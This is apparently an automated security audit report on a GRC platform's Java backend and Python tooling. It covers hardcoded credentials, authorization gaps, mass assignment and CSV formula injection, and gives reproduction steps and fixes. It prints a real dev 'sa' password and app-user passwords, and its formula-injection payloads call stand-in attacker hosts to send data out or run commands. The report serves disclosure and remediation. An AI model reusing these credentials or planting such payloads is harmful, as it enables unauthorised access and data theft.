MediumSEC-PY-002Hardcoded database credentials and plaintext user passwords in Python scripts
SecurityUse of Hard-coded Credentials (A07)▾
Location seed_real_data.py:39 Effort M Risk Risk rationale: dev-only secret (the documented sa/tss.123 dev DB password) hardcoded in ~78 scripts, plus 5 plaintext application user passwords in a password-reset helper. Not a network-exploitable bug, but a real secrets-management hygiene failure: if any of these files reach a shared/public repo or the dev password is ever reused in a non-dev environment, it grants full sa access. Bandit did not emit B105/B106 here because the literals are inside ODBC connection strings / dict values rather than tracked password kwargs; reported per explicit scope to cover hardcoded creds.
.tmp/reset_pw.py:4-10
.tmp/reset_pw.py:16-23
.tools/forensic_final.py:26-27
.tools/introspect_schema.py (CONN_STR with UID=sa;PWD=tss.123)
setup_cyber_db.py / setup_bcm_db.py / 70+ other setup_*/seed_* scripts (UID=sa;PWD=tss.123)

Description

The SQL Server sa credential is hardcoded as 'UID=sa;PWD=tss.123' in 78 Python files at the repo root and under .tools/ (verified by grep: 78 occurrences across 78 files). Separately, .tmp/reset_pw.py embeds five plaintext application-user passwords (Audit@12345, Risk@12345, Compliance@12345, Analyst@12345, Viewer@12345) and then builds UPDATE iam.users SET password_hash = '{h}' ... WHERE username = '{user}' by string interpolation, writing the result to reset_pw.sql. While tss.123 is the documented dev password (CLAUDE.md / application-dev.yml), embedding it and the app passwords in source-controlled scripts spreads the secret widely and couples every utility to one privileged login.

Root cause

No centralised secrets/connection configuration for the Python tooling. Each script copy-pastes the same sa connection string literal, and the password-reset helper hardcodes the credential scheme instead of reading it from the environment or prompting.

Evidence / proof
.tmp/reset_pw.py:4-10
creds = {
    "auditor":    "Audit@12345",
    "rmanager":   "Risk@12345",
    "compliance": "Compliance@12345",
    "ranalyst":   "Analyst@12345",
    "viewer":     "Viewer@12345",
}

seed_real_data.py:39
    'UID=sa;PWD=tss.123;Unicode_Results=Yes;'

.tools/forensic_final.py:26-27
CONN=("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;DATABASE=TSS_GRC;"
      "UID=sa;PWD=tss.123;TrustServerCertificate=yes")

Real-world impact

Anyone with read access to the repo obtains the dev sa password and the standard app-user password scheme. If the dev DB is reachable (it binds localhost:1433 with sa enabled) this is full administrative DB access. The plaintext app passwords reveal the org-wide credential convention (<Role>@12345), which likely matches seeded accounts and is trivially guessable for other roles. Risk escalates sharply if the same literal is ever reused outside dev or if .tmp/ scripts are committed.

Reproduction

1. grep -rn 'PWD=tss.123' *.py .tools/*.py -> 78 files.
2. Open .tmp/reset_pw.py -> five plaintext passwords in the creds dict.
3. With the dev DB up: sqlcmd -S localhost -U sa -P tss.123 -Q "SELECT 1" authenticates as sa.

Resolution

Read the connection string / password from environment variables (e.g. os.environ['DB_PASSWORD'], os.environ.get('GRC_DB_DSN')) — matching the backend's existing DB_PASSWORD convention — with no default that contains a real secret. Provide a single shared db_connect() helper imported by every script so the literal exists in zero places. For reset_pw.py, prompt for the password (getpass) or read from env, and never write plaintext passwords into source. Add the dev password to a .env (git-ignored) and rotate it. Add a secret-scanner (gitleaks/trufflehog) and bandit B105/B106 to CI.

▼ Before (vulnerable)
creds = {
    "auditor": "Audit@12345",
    "rmanager": "Risk@12345",
    ...
}
CONN = "...UID=sa;PWD=tss.123;..."
▲ After (fixed)
import os, getpass
DB_PASSWORD = os.environ["DB_PASSWORD"]  # no hardcoded default
CONN = f"...UID=sa;PWD={DB_PASSWORD};..."
# reset_pw.py: take the new password interactively, never store it
new_pw = getpass.getpass(f"New password for {user}: ")

MediumSEC-RISK-002Raw JPA entities bound as @RequestBody on assessment/treatment/KRI/appetite write endpoints (mass assignment, no @Valid)
SecurityMass Assignment / Broken Access Control (A01/A08)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/risk/controller/RiskAdvancedController.java:48-65 Effort M Risk CVSS 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) — client can set server-managed fields and bypass DTO validation
tss-grc-backend/src/main/java/com/tss/grc/module/risk/controller/RiskAdvancedController.java:79-91
tss-grc-backend/src/main/java/com/tss/grc/module/risk/controller/KriAppetiteController.java:52-62
tss-grc-backend/src/main/java/com/tss/grc/module/risk/controller/KriAppetiteController.java:131-142
tss-grc-backend/src/main/java/com/tss/grc/module/risk/service/RiskAssessmentService.java:57-76

Description

Several write endpoints bind the persistence @Entity directly as the request body with no DTO and no @Valid: RiskAdvancedController.recordAssessment(@RequestBody RiskAssessment body), createTreatment/updateTreatment(@RequestBody RiskTreatment body), and KriAppetiteController.createKri/updateKri(@RequestBody KriDefinition body), createAppetite/updateAppetite(@RequestBody RiskAppetiteStatement body). This lets a client populate any settable column on the entity — e.g. RiskAssessment.assessorId (attribution can be forged to any user id), externalId, assessmentDate; RiskTreatment.completedAt/status on update(); KriDefinition / RiskAppetiteStatement.organisationId could be supplied in JSON. Create paths partly mitigate by overwriting organisationId server-side and calling body.setId(null), but updateTreatment() binds the entity straight onto the managed row with no field allow-list and no validation, and recordAssessment() trusts the body's assessorId. None of these endpoints declare @Valid, so the only constraints are the manual checks inside the service (1..5 scale on assessment; enum sets on treatment/KRI) — fields without a manual check are accepted unvalidated.

Root cause

Controllers expose JPA entities as the API contract instead of purpose-built request DTOs with @Valid constraints and an explicit field allow-list; create methods scrub id/org but update methods and child-attribution fields are not protected.

Evidence / proof
    @PostMapping("/risks/{riskId}/assessments")
    @PreAuthorize("hasPermission('RISK','WRITE')")
    public ResponseEntity<RiskAssessment> recordAssessment(@PathVariable Long riskId,
                                                           @RequestBody RiskAssessment body) {
        body.setRiskId(riskId);
        return ResponseEntity.ok(assessmentService.record(body));
    }
    // createTreatment / updateTreatment likewise: @RequestBody RiskTreatment body (no @Valid)

Real-world impact

Integrity / non-repudiation: an authenticated RISK:WRITE user can forge the assessor of a risk re-assessment (assessorId set from the body, not from the JWT principal), backdate assessmentDate, and set entity fields the API never intended to expose. Forged attribution undermines the audit/attestation trail that the ERM module is built to provide to regulators. Missing @Valid also means malformed values reach the persistence layer where only some are caught.

Reproduction

1. As any RISK:WRITE user, POST /api/v1/risk/risks/{riskId}/assessments with body {"likelihood":3,"impact":3,"assessorId":999,"assessmentDate":"2020-01-01"}. 2. Observe the saved assessment is attributed to user 999 with a backdated date — neither was taken from the authenticated principal.

Resolution

Introduce request DTOs (e.g. RiskAssessmentRequest, RiskTreatmentRequest) carrying only client-writable fields, annotate with Jakarta constraints, and bind with @Valid. Derive assessorId from the authenticated principal (Authentication / GrcUserDetails) rather than the body. On update, copy only the allow-listed fields onto the managed entity. Apply the same DTO pattern to the KRI/appetite create/update endpoints.

▼ Before (vulnerable)
    public ResponseEntity<RiskAssessment> recordAssessment(@PathVariable Long riskId,
                                                           @RequestBody RiskAssessment body) {
        body.setRiskId(riskId);
        return ResponseEntity.ok(assessmentService.record(body));
    }
▲ After (fixed)
    public ResponseEntity<RiskAssessment> recordAssessment(@PathVariable Long riskId,
                                                           @Valid @RequestBody RiskAssessmentRequest req,
                                                           @AuthenticationPrincipal GrcUserDetails principal) {
        // map only allow-listed fields; assessor comes from the token, not the body
        return ResponseEntity.ok(assessmentService.record(
                riskId, req.likelihood(), req.impact(), req.assessmentNotesEn(), req.assessmentNotesAr(),
                principal.getUserId()));
    }

MediumSEC-RISK-003Unbounded client-controlled page size on Emerging-Risk and Scenario list endpoints
SecurityResource Exhaustion / DoS (A05)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/risk/emerging/controller/EmergingRiskController.java:27-33 Effort S Risk CVSS 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) — memory/DB pressure from arbitrarily large page requests
tss-grc-backend/src/main/java/com/tss/grc/module/risk/scenario/controller/RiskScenarioController.java:49-59

Description

EmergingRiskController.list and RiskScenarioController.list accept a raw int 'size' query parameter and pass it straight into PageRequest.of(page, size) with no upper bound. There is no global spring.data.web.pageable.max-page-size configured (grep of src/main/resources returned no match), so a request such as ?size=100000000 instructs Hibernate to fetch and materialise that many rows for the tenant in one query, plus map each to a Response record. RiskController/KriAppetiteController use @PageableDefault which Spring caps at the default max (2000), but these two controllers build the Pageable by hand and bypass that protection.

Root cause

Manual PageRequest.of(page, size) with an unvalidated, unbounded size parameter and no global max-page-size guard.

Evidence / proof
    public Page<Response> list(@RequestParam(required = false) String status,
                               @RequestParam(defaultValue = "0") int page,
                               @RequestParam(defaultValue = "100") int size) {
        return service.list(status, PageRequest.of(page, size)).map(Response::from);
    }

Real-world impact

An authenticated user can drive large result-set fetches that spike heap and DB load, degrading or denying service for the tenant (and, on a shared node, neighbours). Low data-integrity impact but a cheap availability lever.

Reproduction

1. Authenticate. 2. GET /api/risk/emerging?size=100000000 (or /api/risk/scenarios?size=100000000). 3. Observe a single large query / large allocation; repeat to sustain pressure.

Resolution

Clamp size to a sane maximum (e.g. Math.min(size, 200)) and floor page at 0, or switch these endpoints to @PageableDefault/@PageableDefault(size=…) Pageable injection, and set spring.data.web.pageable.max-page-size globally in application.yml as defence in depth.

▼ Before (vulnerable)
    public Page<Response> list(@RequestParam(required = false) String status,
                               @RequestParam(defaultValue = "0") int page,
                               @RequestParam(defaultValue = "100") int size) {
        return service.list(status, PageRequest.of(page, size)).map(Response::from);
    }
▲ After (fixed)
    public Page<Response> list(@RequestParam(required = false) String status,
                               @RequestParam(defaultValue = "0") int page,
                               @RequestParam(defaultValue = "100") int size) {
        int safeSize = Math.min(Math.max(size, 1), 200);
        int safePage = Math.max(page, 0);
        return service.list(status, PageRequest.of(safePage, safeSize)).map(Response::from);
    }

MediumSEC-RISK-004Function-level authorization too coarse: write operations gated only by isAuthenticated()
SecurityBroken Function Level Authorization / BFLA (A01)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/risk/emerging/controller/EmergingRiskController.java:27-75 Effort S Risk CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — any authenticated user can create/mutate risk records regardless of role
tss-grc-backend/src/main/java/com/tss/grc/module/risk/scenario/controller/RiskScenarioController.java:49-109
tss-grc-backend/src/main/java/com/tss/grc/module/capa/controller/CapaTaskController.java:19-53
tss-grc-backend/src/main/java/com/tss/grc/module/risk/fair/FairCalculatorController.java:37-41

Description

EmergingRiskController (all endpoints), RiskScenarioController (all endpoints incl. create/update/approve/reject/archive), CapaTaskController (list/get/create/transition) and FairCalculatorController guard every operation with @PreAuthorize("isAuthenticated()") rather than the module-permission model (hasPermission('RISK','READ'|'WRITE') / hasPermission('CAPA',…)) used by RiskController, RiskCategoryController, KriAppetiteController and TreatmentPlanController. As a result any authenticated principal — including a read-only AUDITOR or any low-privilege role — can create, mutate, approve, reject and archive emerging risks and scenarios, and create/transition CAPA tasks. Tenant scoping is correctly enforced inside the services (so there is no cross-tenant impact), and CAPA delete is correctly restricted to PLATFORM_ADMIN, but the write-path authorization within a tenant is effectively absent. The approve/reject lifecycle on scenarios is a governance control that should not be available to every role.

Root cause

Inconsistent authorization policy: these controllers were wired to isAuthenticated() instead of the ModulePermissionEvaluator hasPermission('RISK', ACTION) checks applied to the rest of the risk module, so role separation (read vs write, sign-off) is not enforced.

Evidence / proof
    @PostMapping("/{id}/approve")
    @PreAuthorize("isAuthenticated()")
    @Operation(summary = "Approve a DRAFT scenario.")
    public Response approve(@PathVariable Long id, Authentication auth) {
        return Response.from(service.approve(id, usernameOf(auth), userIdOf(auth)));
    }

Real-world impact

Within a tenant, role separation collapses for these features: a read-only auditor or any authenticated low-privilege user can author and sign off risk scenarios, emerging risks and CAPA tasks. This undermines the segregation-of-duties posture the GRC platform sells (and that SAMA/NCA governance expects), and lets non-risk users tamper with the risk register.

Reproduction

1. Authenticate as a non-risk role (e.g. auditor / Audit@12345). 2. POST /api/risk/scenarios with a valid body — succeeds (201). 3. POST /api/risk/scenarios/{id}/approve — succeeds despite no risk-write/approve authority.

Resolution

Replace isAuthenticated() with the module-permission checks: reads -> hasPermission('RISK','READ'), writes/transitions -> hasPermission('RISK','WRITE'); for CAPA use the CAPA module permission (matching how delete already restricts to PLATFORM_ADMIN). Consider a dedicated approve/sign-off permission for the scenario approve/reject endpoints to preserve segregation of duties.

▼ Before (vulnerable)
    @PostMapping
    @PreAuthorize("isAuthenticated()")
    public ResponseEntity<Response> create(@Valid @RequestBody CreateRequest req) { ... }
▲ After (fixed)
    @PostMapping
    @PreAuthorize("hasPermission('RISK','WRITE')")
    public ResponseEntity<Response> create(@Valid @RequestBody CreateRequest req) { ... }

MediumSEC-SEC-001Hardcoded SQL Server 'sa' credential (sa/tss.123) committed across ~40 Python bootstrap scripts
SecurityUse of Hard-coded Credentials (CWE-798)▾
Location seed_real_data.py:38-42 Effort M Risk CVSS 5.5 (local/dev-only credential, but committed to VCS and grants full DB sysadmin if the same password is reused in any reachable environment) — risk hinges on credential reuse
setup_cyber_db.py:6-8
setup_bcm_db.py:6-8
setup_committees_db.py:54-56
fix_arabic_db.py:8-12
seed_socops_data.py:29-36
setup_attachments_table.py:10-11
.tools/forensic_final.py:26-27
.tools/apply_v21.py:4-6
fix_arabic_mojibake.py:29-30
.tools/fix_arabic_mojibake.py:156-161

Description

The SQL Server system administrator credential `sa` / `tss.123` is hard-coded as a literal in the pyodbc connection string of roughly 40 repository-root and `.tools/` Python scripts (setup_*.py, seed_*.py, fix_*.py). All of these files are tracked in git (`git ls-files` confirms they are committed, and none are matched by `.gitignore`). `sa` is the highest-privilege account on a SQL Server instance — full control of every database, ability to read/alter all tenant data, enable xp_cmdshell, etc. While CLAUDE.md documents `sa/tss.123` as the intentional local-dev account, the password is a real, weak, reused secret that now lives permanently in repository history. The concrete risk is credential reuse: if any developer, CI runner, or shared/staging SQL Server instance is provisioned with the same `sa` password (a very common shortcut), this commit hands an attacker sysadmin access to that instance.

Root cause

Connection secrets were inlined as string literals in dev tooling instead of being read from environment variables (the backend already does this via `${DB_PASSWORD}`), so the password is duplicated into ~40 files and baked into git history.

Evidence / proof
seed_real_data.py:38-39 — "    'DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;DATABASE=TSS_GRC;'\n    'UID=sa;PWD=tss.123;Unicode_Results=Yes;'"

Real-world impact

Anyone with read access to the repository (or its history) obtains a working sysadmin SQL Server credential. If `tss.123` is reused on any networked/staging instance, this is full database compromise: cross-tenant data exfiltration, tampering, and potential OS command execution via xp_cmdshell. Even confined to localhost dev, it normalises committing real passwords and makes secret rotation impossible without history rewrite.

Reproduction

1. `git log -p -- seed_real_data.py` (or any setup_*.py) shows `UID=sa;PWD=tss.123` in the connection string. 2. From any host that can reach a SQL Server provisioned with this password: `sqlcmd -S <host> -U sa -P tss.123 -Q "SELECT name FROM sys.databases"` succeeds with sysadmin rights.

Resolution

Read the connection string from environment variables in every script (e.g. a shared `db_conn()` helper that reads `DB_PASSWORD`, defaulting only for local dev). Rotate the dev `sa` password and never reuse it outside localhost. Add a pre-commit secret scanner (gitleaks/trufflehog). Treat history scrubbing as optional for a dev-only password but mandatory if `tss.123` is ever used beyond a throwaway local instance.

▼ Before (vulnerable)
CONN_STR = (
    'DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;DATABASE=TSS_GRC;'
    'UID=sa;PWD=tss.123;Unicode_Results=Yes;'
)
conn = pyodbc.connect(CONN_STR)
▲ After (fixed)
import os
CONN_STR = (
    "DRIVER={ODBC Driver 17 for SQL Server};"
    f"SERVER={os.environ.get('DB_HOST','localhost')};DATABASE={os.environ.get('DB_NAME','TSS_GRC')};"
    f"UID={os.environ.get('DB_USERNAME','sa')};PWD={os.environ['DB_PASSWORD']};Unicode_Results=Yes;"
)
conn = pyodbc.connect(CONN_STR)
# DB_PASSWORD must be exported; no default so an unconfigured run fails loudly.

MediumSEC-TPRM-003Missing function-level authorization on third-party cyber-assessment endpoints (isAuthenticated only)
SecurityBroken Function Level Authorization (A01)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/tprm/cyber/controller/ThirdPartyCyberAssessmentController.java:23-61 Effort S Risk CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N) — any authenticated user can create/approve/retire vendor cyber assessments within their org
tss-grc-backend/src/main/java/com/tss/grc/module/tprm/cyber/service/ThirdPartyCyberAssessmentService.java:52-105

Description

Every endpoint on ThirdPartyCyberAssessmentController (GET list, GET /{id}, POST create, POST /{id}/posture, POST /{id}/submit, POST /{id}/approve, POST /{id}/retire) is annotated only with @PreAuthorize("isAuthenticated()"). There is no module/action permission (no hasPermission('TPRM',...) / role guard), unlike the rest of the audited TPRM surface which uses hasPermission('TPRM','READ'/'WRITE') or explicit hasAnyRole(...) lists. As a result any authenticated principal — regardless of whether they have any TPRM entitlement (e.g. an AUDITOR, a read-only user, or a user from an unrelated module) — can read, create, edit, submit, and crucially APPROVE and RETIRE third-party cyber risk assessments. The service is correctly tenant-scoped (findByIdAndOrganisationId), so the exposure is confined to the caller's own organisation, but it is a clear privilege/function-level authorization gap (anyone can self-approve risk acceptance).

Root cause

Authorization on this controller was stubbed with isAuthenticated() and never tightened to a module permission or approver role, in contrast to the platform-wide hasPermission('MODULE','ACTION') convention.

Evidence / proof
@PostMapping("/{id}/approve")
@PreAuthorize("isAuthenticated()")
public ThirdPartyCyberAssessment approve(@PathVariable Long id, @RequestBody Map<String, String> body) {
    return service.approve(id, body.getOrDefault("approverName", "admin"));
}

Real-world impact

Within a tenant, the segregation-of-duties intent of an approve step is voided: a low-privileged user can move a third-party cyber assessment to APPROVED (formal risk acceptance) or RETIRED, and can create/alter posture data that feeds the residual-risk tier. This weakens governance over vendor cyber risk decisions and the associated audit trail.

Reproduction

1. Log in as any authenticated user that has NO TPRM permission (e.g. a user with only a non-TPRM role). 2. curl -X POST http://localhost:8084/api/tprm/cyber-assessments/{id}/approve -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{"approverName":"attacker"}' . The assessment transitions to APPROVED.

Resolution

Replace isAuthenticated() with the platform permission convention: hasPermission('TPRM','READ') on reads, hasPermission('TPRM','WRITE') on create/posture/submit, and a tighter approver guard (e.g. hasAnyRole('CISO','RISK_MANAGER','PLATFORM_ADMIN') or hasPermission('TPRM','APPROVE')) on approve/retire.

▼ Before (vulnerable)
@PostMapping("/{id}/approve")
@PreAuthorize("isAuthenticated()")
public ThirdPartyCyberAssessment approve(@PathVariable Long id, @RequestBody Map<String, String> body) { ... }
▲ After (fixed)
@PostMapping("/{id}/approve")
@PreAuthorize("hasAnyRole('CISO','RISK_MANAGER','PLATFORM_ADMIN')")
public ThirdPartyCyberAssessment approve(@PathVariable Long id, @RequestBody Map<String, String> body) { ... }
// and replace isAuthenticated() with hasPermission('TPRM','READ'/'WRITE') on the other methods

LowSEC-AUTH-003Refresh-token store falls back to organisation_id = 1 when TenantContext is empty
SecurityBroken Access Control / Multi-tenancy (A01) / CWE-840▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/auth/refresh_token/service/RefreshTokenStoreService.java:93-94 Effort S Risk CVSS ~3.1 — tenant-attribution defect on a non-authorization audit row; no direct cross-tenant data read proven
tss-grc-backend/src/main/java/com/tss/grc/module/auth/AuthController.java:86-93
tss-grc-backend/src/main/java/com/tss/grc/module/auth/AuthController.java:163-171

Description

recordIssuance reads orgId from TenantContext and, if null, hard-codes orgId = 1L ("login is the only path where TenantContext isn't yet set"). Both call sites in AuthController do set TenantContext to the principal's / refresh-token's organisationId before calling recordIssuance, so in the normal flows the fallback is not hit. The risk is latent: if a future caller invokes recordIssuance without first populating TenantContext, the refresh-token row is silently mis-attributed to organisation 1 (the seeded TSS GRC tenant). Because the user-facing 'list my sessions' query (listActive/listAll) filters by organisation_id AND user_id, a row stamped with the wrong org would not surface in that user's own session list — i.e. it becomes an invisible/forensically-misleading session record rather than a cross-tenant read. The jti lookup (assertValid/findByJti) is org-agnostic, so refresh/revoke still function regardless of the stamped org.

Root cause

Defensive default that picks an arbitrary concrete tenant id (1) instead of failing closed when the tenant is genuinely unknown.

Evidence / proof
Long orgId = TenantContext.getCurrentTenant();
if (orgId == null) orgId = 1L;   // login is the only path where TenantContext isn't yet set

Real-world impact

Refresh-token audit/session rows can be attributed to the wrong tenant if recordIssuance is ever called outside the two current AuthController paths, undermining per-tenant session forensics and the 'list my active sessions' UI. No proven cross-tenant data disclosure today because both real callers set the context first.

Reproduction

1. Call RefreshTokenStoreService.recordIssuance(...) from a code path that has not set TenantContext (e.g. a future scheduled job or test). 2. Observe the persisted platform.refresh_token row has organisation_id = 1 regardless of the user's real org. 3. That user's GET /api/v1/auth/sessions (filtered by their real org) will not list the session.

Resolution

Pass the principal's organisationId explicitly into recordIssuance rather than reading it from thread-local, or fail closed (throw) when TenantContext is null instead of defaulting to 1. AuthController already has principal.getOrganisationId() / orgId in scope at both call sites.

▼ Before (vulnerable)
Long orgId = TenantContext.getCurrentTenant();
if (orgId == null) orgId = 1L;   // login is the only path where TenantContext isn't yet set
▲ After (fixed)
// Pass orgId in as a parameter from the authenticated principal:
if (organisationId == null) throw new IllegalStateException("organisationId required to record refresh token");
row.setOrganisationId(organisationId);

LowSEC-AUTH-004HMAC key derived from secret using platform-default charset (secret.getBytes())
SecurityCryptographic Failures (A02) / CWE-326▾
Location tss-grc-backend/src/main/java/com/tss/grc/security/JwtTokenProvider.java:83-91 Effort S Risk CVSS ~2.0 — robustness/portability defect; HMAC strength itself is adequate
tss-grc-backend/src/main/java/com/tss/grc/security/JwtTokenProvider.java:108
tss-grc-backend/src/main/java/com/tss/grc/security/JwtTokenProvider.java:127-129

Description

The signing key is built with Keys.hmacShaKeyFor(secret.getBytes()) — String.getBytes() with no Charset argument, so it uses the JVM default charset. If two nodes (or the rotation tooling) run with different default charsets and the secret contains non-ASCII bytes, the derived key differs and tokens fail to verify across nodes. Separately, validateSecret enforces secret.length() >= 32 characters; for a key with non-ASCII characters the byte length (true entropy fed to HMAC) can differ from the character count, and the length check is on characters not bytes. The default dev secret placeholder is correctly rejected by validateSecret (it contains 'change_me'), so the historic 'known default key' regression is mitigated. The algorithm is HS256 via signWith(secretKey) and verification uses Jwts.parser().verifyWith(secretKey) (JJWT 0.12.6), which pins HMAC verification and rejects alg:none / RS-to-HS confusion — so those classic JWT attacks are NOT present.

Root cause

getBytes() without an explicit StandardCharsets.UTF_8 argument, and a strength check expressed in characters rather than key bytes.

Evidence / proof
this.secretKey = Keys.hmacShaKeyFor(secret.getBytes());  // platform-default charset
if (secret.length() < 32) { throw new IllegalStateException("JWT_SECRET must be at least 32 characters (256 bits)..."); }

Real-world impact

Mostly an operational/portability robustness issue: ASCII secrets (the documented recommendation: openssl rand -base64 48) are unaffected, but a non-ASCII secret could cause intermittent token-verification failures across heterogeneous nodes or after a JVM/locale change, and the byte-length of the key is not directly asserted.

Reproduction

1. Set JWT_SECRET to a 32-char string containing multi-byte UTF-8 characters. 2. Run one backend node with file.encoding=UTF-8 and another with a different default charset. 3. Tokens minted on node A may fail signature verification on node B.

Resolution

Use secret.getBytes(StandardCharsets.UTF_8) consistently for both the current and previous keys, and validate the resulting key length in bytes (>= 32 bytes = 256 bits) rather than characters.

▼ Before (vulnerable)
this.secretKey = Keys.hmacShaKeyFor(secret.getBytes());
if (secret.length() < 32) { ... }
▲ After (fixed)
byte[] keyBytes = secret.getBytes(java.nio.charset.StandardCharsets.UTF_8);
if (keyBytes.length < 32) { throw new IllegalStateException("JWT_SECRET must be >= 32 bytes (256 bits)"); }
this.secretKey = Keys.hmacShaKeyFor(keyBytes);

LowSEC-BCM-004Crisis-comms dispatch trusts client-supplied actor identity and unverified crisisEventId
SecurityInsufficient verification of data authenticity (A04/A08) — CWE-345▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/service/CrisisCommsDispatchService.java:102-160 Effort S Risk CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — audit-trail spoofing / cross-event data placement
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/dto/CrisisCommsDtos.java:76-85
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/controller/CrisisCommsDispatchController.java:40-45

Description

The dispatch endpoint records WHO dispatched a crisis communication from request body fields dispatchedByName / dispatchedByUserId rather than from the authenticated principal, so an operator can attribute a cascade to any name/user id. Separately, while the template is verified to belong to the tenant (findByOrganisationIdAndIdAndIsDeletedFalse) and to be APPROVED_BY_CISO, the crisisEventId from the request is stored on the CrisisCommsCascade row without verifying that the crisis event exists in the caller's tenant — so a cascade can be filed under an arbitrary or non-existent crisis event id. The recipients list is arbitrary client-supplied strings (validated only @NotBlank); currently harmless because all ChannelSender implementations are stubs, but becomes a sensitive-data/spam vector once real EMAIL/SMS/WhatsApp integrations land.

Root cause

Actor identity and the crisisEventId association are taken from the untrusted request body instead of being derived from the security context (actor) and validated against tenant-scoped repositories (crisisEventId).

Evidence / proof
DispatchRequest record fields: `@Size(max=255) String dispatchedByName, Long dispatchedByUserId`. Service: `c.setDispatchedByName(req.dispatchedByName()); c.setDispatchedByUserId(req.dispatchedByUserId()); c.setCrisisEventId(req.crisisEventId());` — no SecurityContext lookup, no crisisEvents.findByIdAndOrganisationId(req.crisisEventId()) check.

Real-world impact

An authorized dispatcher can repudiate or misattribute a crisis communication in the audit log, and can associate cascade rows with crisis events that belong to another tenant or do not exist, polluting per-event timelines and undermining the F7 audit trail regulators rely on.

Reproduction

1. As a CISO/COMMS_LEAD, POST /api/v1/bcm/comms/v2/dispatch with dispatchedByName='Someone Else', dispatchedByUserId=<other user> and crisisEventId=<arbitrary>. 2. Observe the persisted cascade + audit row attribute the action to the spoofed identity and the bogus event id.

Resolution

Derive dispatchedByName/dispatchedByUserId from SecurityContextHolder (the authenticated GrcUserDetails), ignoring any client-supplied values, and validate req.crisisEventId() with a tenant-scoped crisis-event lookup before persisting the cascade.

▼ Before (vulnerable)
c.setCrisisEventId(req.crisisEventId());
c.setDispatchedByName(req.dispatchedByName());
c.setDispatchedByUserId(req.dispatchedByUserId());
▲ After (fixed)
crisisEvents.findByIdAndOrganisationId(req.crisisEventId(), orgId)
    .orElseThrow(() -> new EntityNotFoundException("Crisis event not in tenant: " + req.crisisEventId()));
GrcUserDetails me = (GrcUserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
c.setCrisisEventId(req.crisisEventId());
c.setDispatchedByName(me.getDisplayName());
c.setDispatchedByUserId(me.getId());
References: CWE-345: Insufficient Verification of Data Authenticity · CWE-639: Authorization Bypass Through User-Controlled Key · OWASP A08:2021 Software and Data Integrity Failures
LowSEC-BCM-005CSV/spreadsheet formula injection in BCM audit evidence package export
SecurityInjection (A03) — CWE-1236 CSV Formula Injection▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/service/BcmEvidencePackageService.java:313-337 Effort S Risk CVSS 3.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N) — code execution on the auditor's machine when opening the export
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/service/BcmEvidencePackageService.java:167-196

Description

The evidence package generator writes user-controlled free-text fields into audit_log.csv (the AuditLogEntry.message column, plus entityCode/severity) and into the .xlsx sheets (BIA mbco, gap/CAPA descriptions, treatment plans, etc.). The CSV writer's csv() helper only quotes values containing comma/quote/newline; it does NOT neutralise values that begin with =, +, -, @ or tab/CR. When a regulator or external auditor opens the exported CSV/XLSX in Excel or LibreOffice, such a cell is interpreted as a formula (e.g. =cmd|'/c calc'!A1 or =HYPERLINK/WEBSERVICE exfiltration). Because the message text is attacker-influenceable upstream (titles, codes, notes flow into audit messages), a tenant user can plant a malicious formula that executes on the auditor's workstation when the official evidence pack is reviewed.

Root cause

Export routines escape for CSV delimiter safety only, not for spreadsheet formula safety; no leading-character neutralisation is applied before writing user-controlled strings to CSV/XLSX cells.

Evidence / proof
csv() helper: `if (v.contains(",") || v.contains("\"") || v.contains("\n")) { return "\"" + v.replace("\"","\"\"") + "\""; } return v;` — a value like `=WEBSERVICE("http://evil/?"&A1)` is emitted verbatim. writeAuditCsv appends csv(e.getMessage()) directly.

Real-world impact

Formula injection executing in the context of whoever opens the official BCM evidence bundle (typically an external auditor or SAMA/NCA reviewer) — data exfiltration or command execution on a trusted reviewer's machine, with the file carrying the platform's integrity SHA-256 manifest lending it false trust.

Reproduction

1. Create a BCM artefact whose name/notes is `=HYPERLINK("http://attacker/"&A1,"click")` (or `=cmd|'/c calc'!A1`). 2. Trigger evidence-package generation for the cycle. 3. Open audit_log.csv / the xlsx in Excel — the formula evaluates.

Resolution

Prefix any cell value beginning with =, +, -, @, tab or CR with a single quote (or a leading space) before writing, in both the CSV writer and the XLSX cell setters. Centralise this in a sanitizeForSpreadsheet() helper.

▼ Before (vulnerable)
private static String csv(String v) {
    if (v == null) return "";
    if (v.contains(",") || v.contains("\"") || v.contains("\n")) {
        return "\"" + v.replace("\"", "\"\"") + "\"";
    }
    return v;
}
▲ After (fixed)
private static String csv(String v) {
    if (v == null) return "";
    String s = neutraliseFormula(v);
    if (s.contains(",") || s.contains("\"") || s.contains("\n")) {
        return "\"" + s.replace("\"", "\"\"") + "\"";
    }
    return s;
}
private static String neutraliseFormula(String v) {
    if (!v.isEmpty() && "=+-@\t\r".indexOf(v.charAt(0)) >= 0) return "'" + v;
    return v;
}
// apply neutraliseFormula(...) to String cell values in writeXlsx / writeGapsAndCapasXlsx too
References: CWE-1236: Improper Neutralization of Formula Elements in a CSV File · OWASP A03:2021 Injection · OWASP CSV Injection guidance
LowSEC-CFG-002CORS configuration bean is never wired into the Spring Security filter chain
SecuritySecurity Misconfiguration (A05:2021 / CWE-942)▾
